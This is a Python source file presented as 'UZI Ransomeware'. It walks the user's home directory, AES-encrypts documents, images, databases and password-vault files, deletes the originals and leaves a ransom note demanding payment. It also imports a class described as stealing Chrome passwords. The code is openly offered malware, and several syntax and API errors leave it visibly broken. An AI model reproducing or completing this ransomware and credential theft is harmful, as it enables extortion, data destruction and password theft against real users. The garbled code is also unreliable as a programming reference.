#!/usr/bin/python
# Making python executable
""" UZI Ransomeware"""
import os
# TO enter command line commands
from Crypto import Random
# Better than randinit
from Crypto.Cipher import AES
# We will be using Advanced Encryption Standard for Encryption
from Crypto.Hash import SHA256
# We will use SHA256 to generate a key for encryption
from cp import cpass
# TO steal chrome passwords.
# The cp class will be uploaded later.
files_extensions = ["txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "jpg", "png", "csv", "sql", "sln", "php", "html", "asp", "aspx", "html", "xml", "svg", "mdb", "psd", "pdf", "kdbx", "odt"]
# All the file to lock. We need to only lock important files


def file():
    # File finder
    path = os.getenv('HOME')
    # Getting the root/main folder
    try:
        obj = cpass()
        obj.mt()
    finally:
        pass
    """ The above try ANd accept block is to copy chrome passwords. The chrome 
    for pat in path:
        for root, dirs, files in os.walk(path):
            # Getting all the paths in the system
            for names in files:
                zd = names.split('.')
                for fe in files_extensions:
                    if fe == zd[len(zd)-1]:
                        # This checks if the file extensions are equal
                        encrypt_file(SHA256.new("SOME random string").digest(), str(os.path.join(root, names)))  # print str(os.path.join(root, names)) == All the # # files
                        # This generates a 16 bit key, and it sends the file to encrypt_file() method which locks it.
    note()
    # Calling note() method to make a README file to tell him ~ Screwed Bruh.
if __name__ == "__main__":
    file()
    # This to start execution of the function as soon as the program is run


def note():
    n = """Hi,

    Proceed to THISAwesomesite.org for biling :-)
    or the i shall delete the key.
    Enjoy """
    dir = os.getenv('HOME') + "/Desktop/"
    out_file = dir + "README"
    # The directory the file is to be stored
    fhand = open(out_file, 'w')
    # Ww will be writing n to the README file.
    fhand.write(n)
    fhand.close()
    # Finished writing the note


def encrypt_file(paraphrase, filename):
    chunksize = 65536
    # Because 256^2 == 65536 ## Kididng it is 64*1024
    fl_nm, ext = os.path.splittext(filename)
    # This contains the file name
    ext += ' ' * (16 - (len(ext) % 16))
    # For files below 16 bytes need to be padded, to make it atleast 16 bytes
    op_file = fl_nm + ".rw"
    # This hold the new file extensions
    sizef = str(os.path.getsize(filename).zfill(16))
    # This hold the file size, if less than 16 bytes, will be padded by spaces
    iv = ''
    # the initialization vector
    for i in range(16):
        # For iterating 16 times to give a true random value to the initialization vector
        iv += chr(Random(0,255)
    encryptor= AES.new(paraphrase, AES.MODE_CBC, iv)
    # Calls AES function parses the paraphrase , the mode and the initialization vector

    with open(filename, 'rb') as fhan:
        with open(op_file, 'wb') as ofhan:
            # We create a new binary file to store the encrypted things
            ofhan.write(ext)
            #To indicate how much of the file is filled with space. This will help in decrytpion
            ofhan.write(sizef)
            #Useful for decrytpion
            ofhan.write(iv)
            #useful for decryption
            While True:
            chunk = fhan.read(chunksize)
            if len(chunk) == 0: break
            elif len(chunk) %16 != 0: chunk += ' '*(16 - (len(chunk) % 16)
            ofhan.write(encryptor.encrypt(chunk))os.unlink(filename)
            # os.unlink deletes the original filename
            # This is the end of encryption
